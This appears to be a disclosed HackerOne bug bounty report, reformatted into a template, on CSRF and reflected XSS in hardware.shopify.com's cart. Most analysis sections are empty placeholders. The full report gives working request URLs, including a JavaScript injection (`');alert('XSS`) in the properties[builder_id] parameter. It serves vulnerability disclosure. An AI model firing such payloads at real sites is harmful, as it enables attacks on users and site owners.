# XSS on hardware.shopify.com

## Metadata
- **Source:** HackerOne
- **Report:** 116006 | https://hackerone.com/reports/116006
- **Submitted:** 2016-02-11
- **Reporter:** mdv
- **Program:** Unknown
- **Bounty:** $500
- **Severity:** unknown
- **Vuln:** Cross-site Scripting (XSS) - Generic
- **CVEs:** None
- **Category:** web-api

## Summary
Hello @Shopify.
I found CSRF and XSS, that very good combine with each other.
### CSRF
This CSRF is not dangerous, but is serves me in order to perform other bugs.
For example, here CSRF for adding product:
```
http://hardware.shopify.com/cart/add?&id=1106494145&iPad Stand=1120276481&Cash Drawer=1120176153&Receipt Printer=1120166789&attributes[cart_exists]=true&properties[builder_id]=shapp_options

## Attack scenario
*(see original)*

## Root cause
*(see original)*

## Attacker mindset
*(see original)*

## Defensive takeaways
*(see original)*

## Variant hunting
*(see original)*

## MITRE ATT&CK
*(see original)*

## Notes
*(see original)*

## Full report
<details><summary>Expand</summary>

Hello @Shopify.
I found CSRF and XSS, that very good combine with each other.
### CSRF
This CSRF is not dangerous, but is serves me in order to perform other bugs.
For example, here CSRF for adding product:
```
http://hardware.shopify.com/cart/add?&id=1106494145&iPad Stand=1120276481&Cash Drawer=1120176153&Receipt Printer=1120166789&attributes[cart_exists]=true&properties[builder_id]=shapp_options_421549285_1455208671885&properties[master_builder]=1&properties[test]=test&properties[value]=11&add
```
Works with GET and POST requests, which greatly simplifies the work.
### XSS
To reproduce this XSS, visit this link:
```
http://hardware.shopify.com/cart/add?id=1106494145&iPad Stand=1120276481&Cash Drawer=1120176153&Receipt Printer=1120166789&attributes[cart_exists]=true&properties[builder_id]=shapp_options_421549285_1455208671885%27%29%3Balert%28%27XSS&properties[master_builder]=1&properties[test]=test&properties[value]=11&add
```
And click "Remove" in attached product.
Vulnerable parameter: `properties[builder_id]`
For this XSS i used `');alert('XSS`

</details>

---
*Analysed by Claude on 2026-05-24*
